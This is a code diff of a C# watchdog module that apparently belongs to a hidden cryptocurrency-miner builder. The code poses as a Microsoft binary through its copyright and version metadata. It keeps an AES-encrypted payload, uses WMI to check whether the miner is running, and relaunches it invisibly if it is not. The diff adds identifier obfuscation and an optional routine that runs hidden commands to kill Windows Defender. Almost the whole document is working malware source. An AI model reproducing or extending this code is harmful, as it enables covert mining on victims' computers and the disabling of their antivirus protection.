@@ -18,20 +18,18 @@ using System.Windows.Forms;
 [assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")]
 [assembly: AssemblyFileVersion("10.0.19041.746")]
 
-[assembly: Guid("%Guid%")]
-
 public partial class RProgram
 {
-    public static byte[] rxM = { };
-    public static int rcheckcount = 0;
-    public static string rplp = PayloadPath;
+    public static byte[] _rxm_ = { };
+    public static int _rcheckcount_ = 0;
+    public static string _rplp_ = PayloadPath;
 
     public static void Main()
     {
         try
         {
-            rxM = RAES_Method(File.ReadAllBytes(rplp), true);
-            RWDLoop();
+            _rxm_ = _rAESMethod_(File.ReadAllBytes(_rplp_), true);
+            _rWDLoop_();
         }
         catch (Exception ex)
         {
@@ -42,49 +40,61 @@ public partial class RProgram
         }
     }
 
-    public static void RWDLoop()
+    public static void _rWDLoop_()
     {
         try
         {
-            bool rarg2 = false;
-            string rarg3 = Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#MINERID")));
+            bool _rarg2_ = false;
 
-            var rarg4 = new ConnectionOptions();
-            rarg4.Impersonation = ImpersonationLevel.Impersonate;
-            var rarg5 = new ManagementScope(@"\root\cimv2", rarg4);
-            rarg5.Connect();
+            var _rarg4_ = new ConnectionOptions();
+            _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
+            var _rarg5_ = new ManagementScope(@"\root\cimv2", _rarg4_);
+            _rarg5_.Connect();
 
-            var rarg7 = new ManagementObjectSearcher(rarg5, new ObjectQuery(string.Format("Select CommandLine from Win32_Process where Name='{0}'", Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#InjectionTarget")))))).Get();
-            foreach (ManagementObject retObject in rarg7)
+            var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(string.Format(_rGetString_("#MINERQUERY"), Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String("#InjectionTarget")))))).Get();
+            foreach (ManagementObject retObject in _rarg7_)
             {
-                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains(rarg3))
+                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains(_rGetString_("#MINERID")))
                 {
-                    rarg2 = true;
+                    _rarg2_ = true;
                 }
             }
 
-            if (!File.Exists(rplp) || !rarg2)
+            if (!File.Exists(_rplp_) || !_rarg2_)
             {
-                if (!File.Exists(rplp) || rcheckcount > 2)
+                if (!File.Exists(_rplp_) || _rcheckcount_ > 2)
                 {
-                    rcheckcount = 0;
-                    File.WriteAllBytes(rplp, RAES_Method(rxM));
+                    _rcheckcount_ = 0;
+#if DefKillWD
+                    try
+                    {
+                        _rCommand_(_rGetString_("#SCMD"), _rGetString_("#KillWDCommands"));
+                    }
+                    catch (Exception ex)
+                    {
+#if DefDebug
+                    MessageBox.Show("W2.5: " + Environment.NewLine + ex.ToString());
+#endif
+                    }
+#endif
+                    File.WriteAllBytes(_rplp_, _rAESMethod_(_rxm_));
                     Process.Start(new ProcessStartInfo
                     {
-                        FileName = rplp,
+                        FileName = _rplp_,
                         WindowStyle = ProcessWindowStyle.Hidden,
-                        WorkingDirectory = Path.GetDirectoryName(rplp),
+                        WorkingDirectory = Path.GetDirectoryName(_rplp_),
                         CreateNoWindow = true,
                     });
+                    Environment.Exit(0);
                 }
                 else
                 {
-                    rcheckcount += 1;
+                    _rcheckcount_ += 1;
                 }
 
             }
-            Thread.Sleep(startDelay * 1000 + 5000);
-            RWDLoop();
+            Thread.Sleep(startDelay * 1000 + 20000);
+            _rWDLoop_();
         }
         catch (Exception ex)
         {
@@ -95,20 +105,48 @@ public partial class RProgram
 
     }
 
-    public static byte[] RAES_Method(byte[] rarg1, bool rarg2 = false)
+    public static string _rGetString_(string _rarg1_)
     {
-        var rarg3 = Encoding.ASCII.GetBytes("#IV");
-        var rarg4 = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
-        var rarg5 = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
-        var rarg6 = rarg2 ? rarg5.CreateEncryptor(rarg4.GetBytes(16), rarg3) : rarg5.CreateDecryptor(rarg4.GetBytes(16), rarg3);
-        using (var rarg7 = new MemoryStream())
+        return Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+    }
+
+    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
+    {
+        var _rarg3_ = Encoding.ASCII.GetBytes("#IV");
+        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
+        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
+        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), _rarg3_) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), _rarg3_);
+        using (var _rarg7_ = new MemoryStream())
         {
-            using (var rarg8 = new CryptoStream(rarg7, rarg6, CryptoStreamMode.Write))
+            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
             {
-                rarg8.Write(rarg1, 0, rarg1.Length);
-                rarg8.Close();
+                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
+                _rarg8_.Close();
             }
-            return rarg7.ToArray();
+            return _rarg7_.ToArray();
+        }
+    }
+
+    public static void _rCommand_(string _rarg1_, string _rarg2_)
+    {
+        try
+        {
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = _rarg1_,
+                Arguments = _rarg2_,
+                WorkingDirectory = Environment.SystemDirectory,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardOutput = true
+            });
+        }
+        catch (Exception ex)
+        {
+#if DefDebug
+                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
+#endif
         }
     }
 }
